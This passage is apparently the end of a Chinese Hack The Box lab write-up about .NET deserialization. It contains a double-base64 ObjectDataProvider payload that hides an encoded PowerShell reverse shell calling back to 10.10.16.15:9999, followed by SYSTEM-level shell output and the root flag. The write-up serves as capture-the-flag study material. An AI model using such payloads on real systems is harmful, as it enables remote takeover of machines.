1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z0xXNXZjQ0F0ZHlCb2FXUmtaVzRnTFdWdVl5QktRVUpxUVVRd1FWUm5RbXhCU0dOQlRGRkNVRUZIU1VGaFowSnNRVWROUVdSQlFXZEJSazFCWlZGQ2VrRklVVUZhVVVKMFFVTTBRVlJuUW14QlNGRkJUR2RDVkVGSE9FRlpkMEp5UVVkVlFXUkJRbnBCUXpSQlZrRkNSRUZHUVVGUmQwSnpRVWRyUVZwUlFuVkJTRkZCUzBGQmFVRkVSVUZOUVVGMVFVUkZRVTFCUVhWQlJFVkJUbWRCZFVGRVJVRk9VVUY0UVVOSlFVeEJRVFZCUkd0QlQxRkJOVUZEYTBGUGQwRnJRVWhOUVZCUlFXdEJSMDFCVEdkQ1NFRkhWVUZrUVVKVVFVaFJRV05uUW14QlIwVkJZbEZCYjBGRGEwRlBkMEppUVVkSlFXVlJRakJCUjFWQlYzZENaRUZHTUVGS1FVSnBRVVF3UVUxQlFYVkJRelJCVG1kQk1VRkVWVUZOZDBFeFFVaDNRVXBSUWpkQlJFRkJabEZCTjBGSVkwRmhRVUp3UVVkM1FWcFJRVzlCUTJkQlNrRkNjRUZFTUVGS1FVSjZRVU0wUVZWblFteEJSMFZCV2tGQmIwRkRVVUZaWjBGelFVUkJRVXhCUVd0QlIwbEJUR2RDVFVGSFZVRmlaMEp1UVVoUlFXRkJRWEJCUTJ0QlNVRkJkRUZITkVGYVVVRm5RVVJCUVV0UlFqZEJRMUZCV2tGQk9VRkRaMEZVWjBKc1FVaGpRVXhSUWxCQlIwbEJZV2RDYkVGSFRVRmtRVUZuUVVaUlFWcFJRalJCU0ZGQlRHZENRa0ZHVFVGUmQwSktRVVZyUVZKUlFuVkJSMDFCWW5kQ2EwRkhhMEZpWjBKdVFVTnJRVXhuUWtoQlIxVkJaRUZDVkVGSVVVRmpaMEp3UVVjMFFWcDNRVzlCUTFGQldXZEJjMEZFUVVGTVFVRnJRVWRyUVV0UlFUZEJRMUZCWTJkQk9VRkRaMEZoVVVKc1FVaG5RVWxCUVd0QlIxRkJTVUZCZVVGRU5FRktaMEY0UVVoM1FWUjNRakZCU0ZGQlRGRkNWRUZJVVVGalowSndRVWMwUVZwM1FYQkJRM05CU1dkQ1VVRkdUVUZRWjBGblFVTkpRVTkzUVd0QlNFMUJXV2RCT1VGRFowRlhkMEpWUVVkVlFXVkJRakJCUXpSQlVsRkNkVUZIVFVGaWQwSnJRVWRyUVdKblFtNUJSakJCVDJkQk5rRkZSVUZWZDBKRVFVVnJRVk5SUVhCQlF6UkJVbmRDYkVGSVVVRlJaMEkxUVVoUlFWcFJRbnBCUTJkQlNrRkNlVUZEYTBGUGQwRnJRVWhOUVV4blFsaEJTRWxCWVZGQ01FRkhWVUZMUVVGclFVaE5RVmxuUVhOQlJFRkJURUZCYTBGSVRVRlpaMEYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVV4blFrZEJSM2RCWkZGQ2VrRkhaMEZMUVVGd1FVZ3dRVTkzUVd0QlIwMUJUR2RDUkVGSGQwRmlkMEo2UVVkVlFVdEJRWEJCUVQwOUlpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw<span style=color:#f92672>==</span>
+</span></span></code></pre></div><p>拿到 root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS&gt; whoami
+</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\s</span>ystem
+</span></span><span style=display:flex><span>PS&gt; pwd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Path
+</span></span><span style=display:flex><span>----
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32
+</span></span><span style=display:flex><span>PS&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dministrator<span style=color:#ae81ff>\D</span>esktop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-ar---       10/09/2026     02:53             <span style=color:#ae81ff>34</span> root.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PS&gt; type root.txt
+</span></span><span style=display:flex><span>ca6612a2cb0898044911b415ee40c381
+</span></span></code></pre></div></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://enilmalus.github.io/tags/hack/>Hack</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/tgt/>TGT</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+3319 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2026-09-10 06:00</p></div><div class=pagination><div class=pagination__buttons><span class="button next"><a href=https://enilmalus.github.io/posts/htb-monteverde-wirteup/><span class=button__text>HTB-Monteverde Wirteup</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x+ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script></body></html>
